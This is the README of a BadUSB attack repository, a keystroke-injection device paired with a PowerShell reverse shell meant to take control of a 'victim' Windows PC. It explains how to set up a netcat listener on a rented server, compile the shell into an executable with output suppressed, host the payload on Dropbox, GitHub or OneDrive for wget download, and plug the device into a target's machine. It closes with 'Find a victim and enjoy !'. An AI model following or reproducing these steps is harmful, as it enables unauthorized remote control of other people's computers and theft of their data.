## Original repo
https://github.com/tuconnaisyouknow/BadUSB_reverseShellInjector

# BadUSB_reverseShellInjector

# Warning ⚠️
Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**.
# About ℹ️
This **script** allows you to take **control** of a **PC** with **reverse shell** attack.
### NB n°1 (for arduino BadUSB)
Sometimes, you will see something like this : 
``` 
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(173);
Keyboard.releaseAll(); 
```
This is only to write these characters : "@", "\\". But it depends on the computer's layout, so adapt these characters thanks to this [site](https://www.csee.umbc.edu/portal/help/theory/ascii.txt) and the sequence you actually use to wirte these characters with your keyboard. (or switch the keyboard layout to French).
### US Layout
For US layout you only have to replace by this for "\\" :
```
Keyboard.press(92);
Keyboard.releaseAll();
```
And by this for "@" :
```
Keyboard.press(64);
Keyboard.releaseAll();
```
### NB n°2
You can customize the **delay** according to the speed in which you plug the **BadUSB**.
### NB n°3
When you plug the BadUSB in a PC you  have to wait for the caps lock to flash to unplug it.
# Getting Started ✔️
## Requirments
1. Have a **BadUSB**.

2. Install **Arduino software** [here](https://www.arduino.cc/en/software) (if you use a BadUSB which is based on arduino);

3. [Have an ssh server](https://github.com/tuconnaisyouknow/BadUSB_reverseShellInjector#linode);

4. [Download PS2EXE](https://github.com/tuconnaisyouknow/BadUSB_reverseShellInjector#ps2exe);

5. Have a victim with **Windows OS** installed in his PC;
## Linode
1. Create an account [here](https://www.linode.com/);

2. Go to create, linode;

3. Select Ubuntu 18.04 LTS distribution;

4. Select the region closest to where you live;

5. Select shared CPU, Nanode 1GB;

6. Choose your server label and password;

7. Create linode;

8. Now open a terminal and type the ssh access command (ssh root@your_ssh_ip_adress);

9. You are now connected to your ssh server;

10. To make your ssh server always listening type this commands :
```
screen
nc -lnvp 87 -s your_ssh_ip_adress
CTRL + A
D
```
11. Your ssh server is now listening and you can exit;

12. To resume your listening screen, just type :
```
screen -r
```
## PS2EXE
1. Go in this [link](https://github.com/MScholtes/PS2EXE) and click on green button on right top of main page. Then click on "Download Zip" and extract zip file.

2. Start powershell as admin and type the following commands :
```
Set-Loction $env:HOMEPATH\Downloads\PS2EXE-master\Win-PS2EXE
Set-ExecutionPolicy Unrestricted -Force
Import-Module ps2exe
win-ps2exe
```

3. * Select source file (the file you want to convert).
   * Select target file (the directory where you want your file to be).
   * Select icon file (you can download some icons [here](https://iconarchive.com/)).
   * Check Supress output and Suppress error output.
   * Then click on compile button to finish the convertion.
## Install
1. Download this repository;

**Linux :**
```
git clone https://github.com/tuconnaisyouknow/BadUSB_reverseShellInjector
cd BadUSB_reverseShellInjector
```
**Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.

2. Replace LINK in [.txt](https://github.com/tuconnaisyouknow/BadUSB_reverseShellInjector/blob/main/BadUSB_reverseShellInjector.txt) at line 28 or in [.ino](https://github.com/tuconnaisyouknow/BadUSB_reverseShellInjector/blob/main/BadUSB_reverseShellInjector.ino) at line 93;

3. Replace LINK [here](https://github.com/tuconnaisyouknow/BadUSB_reverseShellInjector/blob/main/script.ps1) at line 8 and replce IP and PORT [here](https://github.com/tuconnaisyouknow/BadUSB_reverseShellInjector/blob/main/reverseShell.ps1) at line 3;

4. [Convert reverseShell.ps1 file in .exe file](https://github.com/tuconnaisyouknow/BadUSB_reverseShellInjector#ps2exe);

5. Put the .ino or .txt file in your **BadUSB**;

5. Find a victim and enjoy !
## Requirments for victim PC
* Turn off caps lock.
* Switch the keyboard layout to French (or adapt the code according to your layout).
# How to set a link for wget the script ⬇️
## Dropbox
1. Create a dropbox account [here](https://www.dropbox.com);

2. Upload your file;

3. Copy the link of the file and change ?dl=0 by ?dl=1;

4. You will get a link like this : https://dropbox.com/s/link/YOURFILE?dl=1;

5. Now put this link in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) file;
## Github
1. Create a Github account [here](https://github.com/signup);

2. Create a public repository;

3. Upload your file;

4. Go to your file page and click on RAW button;

5. Copy the RAW page link and put it in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) file;
## One Drive
1. Create a One Drive account [here](https://signup.live.com/signup);

2. Upload your file file;

3. Follow this [tutorial](https://mangolassi.it/topic/19276/how-to-configure-a-onedrive-file-for-use-with-wget)

4. Put the link you got in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt)
